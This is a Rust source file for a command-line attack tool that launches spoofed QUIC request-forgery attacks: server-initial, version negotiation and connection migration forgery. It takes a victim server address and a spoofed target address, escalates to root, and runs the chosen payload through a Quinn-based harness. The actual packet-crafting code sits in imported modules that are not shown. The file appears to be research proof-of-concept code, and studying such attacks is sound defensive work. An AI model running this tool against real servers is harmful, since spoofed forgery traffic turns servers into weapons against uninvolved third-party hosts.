use core::{payload::Payload, network::Harness};
use core::clients::QuinnClient;
use core::utils::check_caps;
use simplelog::*;
use std::env;

use sudo;

use std::{error::Error, net::SocketAddr};

use hex::FromHex;

use color_eyre::eyre::{eyre, Result, WrapErr};

use clap::{Parser, Subcommand};

/// Convert hex string to byte vector
fn parse_connection_id(id: &str) -> Result<Vec<u8>> {
    Vec::from_hex(id).map_err(|err| eyre!("{}", err).wrap_err("Invalid hex data."))
}

#[derive(Debug, Parser)]
struct Cli {
    /// Server address
    #[arg(long)]
    victim_addr: SocketAddr,

    /// Spoofed source address
    #[arg(long)]
    target_addr: SocketAddr,

    /// Keylog File
    #[arg(long)]
    keylog_file: Option<String>,

    /// Attack type
    #[command(subcommand)]
    command: Commands,
}

#[derive(Debug, Subcommand)]
enum Commands {
    /// Server-initial request forgery
    Sirf {
        #[arg(long, value_parser = parse_connection_id)]
        scid: std::vec::Vec<u8>,
    },
    /// Version negotiation request forgery
    Vnrf {
        /// Source Connection Id
        #[arg(long, value_parser = parse_connection_id)]
        scid: std::vec::Vec<u8>,
        /// Destination Connection Id
        #[arg(long, value_parser = parse_connection_id)]
        dcid: std::vec::Vec<u8>,
        /// Version number to use
        #[arg(long, default_value_t = 0x13371337)]
        version: u32,
    },
    /// Connection migration request forgery.
    Cmrf {
        #[arg(long, value_parser = parse_connection_id)]
        scid: std::vec::Vec<u8>,
        /// Number of packets to wait before spoofing.
        #[arg(long, default_value_t = 3)]
        threshold: u32,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    TermLogger::init(
        LevelFilter::Info,
        Config::default(),
        TerminalMode::Mixed,
        ColorChoice::Auto,
    )
    .unwrap();
    color_eyre::install()?;

    sudo::escalate_if_needed()
        .map_err(|_| eyre!("Invalid priviledges."))?;

    let args = Cli::parse();

    if let Some(keylog_file) = args.keylog_file.as_deref() {
        env::set_var("SSLKEYLOGFILE", &keylog_file);
    }

    let mut harness = Harness::<QuinnClient>::new(args.victim_addr, args.target_addr)?;

    let payload = match args.command {
        Commands::Sirf { scid } => {
            Payload::Sirf {
                scid,
            }
        },
        Commands::Vnrf { dcid, scid, version } => {
            Payload::Vnrf {
                scid,
                dcid,
                version
            }
        },
        Commands::Cmrf { scid, threshold } => {
            Payload::Cmrf {
                scid,
                threshold
            }
        },
    };

    harness.run(payload).await?;

    info!("Attack executed, exiting.");

    Ok(())
}
